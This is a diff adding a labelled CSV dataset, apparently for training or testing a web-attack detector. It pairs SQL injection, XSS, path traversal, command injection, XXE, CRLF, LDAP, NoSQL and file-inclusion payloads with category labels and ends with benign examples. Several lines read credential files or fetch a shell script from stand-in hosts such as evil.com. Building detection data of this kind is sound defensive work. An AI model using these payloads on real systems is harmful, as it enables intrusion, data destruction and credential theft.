@@ -1,0 +1,53 @@
+input,label
+' OR 1=1--,SQL_INJECTION
+' OR '1'='1,SQL_INJECTION
+" OR "1"="1,SQL_INJECTION
+' UNION SELECT NULL--,SQL_INJECTION
+admin' OR '1'='1'--,SQL_INJECTION
+1' AND 1=1--,SQL_INJECTION
+' DROP TABLE users--,SQL_INJECTION
+'; DELETE FROM products--,SQL_INJECTION
+1 UNION SELECT password FROM users--,SQL_INJECTION
+<script>alert(1)</script>,XSS
+<script>alert(document.cookie)</script>,XSS
+<img src=x onerror=alert(1)>,XSS
+<iframe src=javascript:alert(1)>,XSS
+javascript:alert('XSS'),XSS
+<body onload=alert(1)>,XSS
+<svg onload=alert(1)>,XSS
+<input onfocus=alert(1) autofocus>,XSS
+../../../etc/passwd,PATH_TRAVERSAL
+..\..\windows\system32\config\sam,PATH_TRAVERSAL
+....//....//....//etc/passwd,PATH_TRAVERSAL
+..%2F..%2F..%2Fetc%2Fpasswd,PATH_TRAVERSAL
+/etc/passwd,PATH_TRAVERSAL
+; cat /etc/passwd,COMMAND_INJECTION
+| whoami,COMMAND_INJECTION
+; ls -la,COMMAND_INJECTION
+&& cat /etc/shadow,COMMAND_INJECTION
+`cat /etc/passwd`,COMMAND_INJECTION
+$(whoami),COMMAND_INJECTION
+; wget http://evil.com/shell.sh,COMMAND_INJECTION
+| curl http://attacker.com,COMMAND_INJECTION
+http://example.com/redirect?url=http://evil.com,OPEN_REDIRECT
+redirect=http://attacker.com,OPEN_REDIRECT
+username=*)(&(password=*),LDAP_INJECTION
+(|(uid=*)(userPassword=*)),LDAP_INJECTION
+{"$ne": null},NOSQL_INJECTION
+{$where: "this.password == 'password'"},NOSQL_INJECTION
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>,XXE_INJECTION
+<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]>,XXE_INJECTION
+GET / HTTP/1.1%0d%0aHost: evil.com,CRLF_INJECTION
+header=%0d%0aSet-Cookie: admin=true,CRLF_INJECTION
+http://example.com/page.php?file=php://filter/convert.base64-encode/resource=config.php,LFI_RFI
+include.php?page=http://evil.com/shell.txt,LFI_RFI
+http://www.google.com,BENIGN
+https://www.facebook.com/profile,BENIGN
+http://example.com/products?id=123,BENIGN
+https://api.github.com/users,BENIGN
+normal text here,BENIGN
+hello world,BENIGN
+test@email.com,BENIGN
+search query: machine learning,BENIGN
+user123,BENIGN
+https://stackoverflow.com/questions/12345,BENIGN
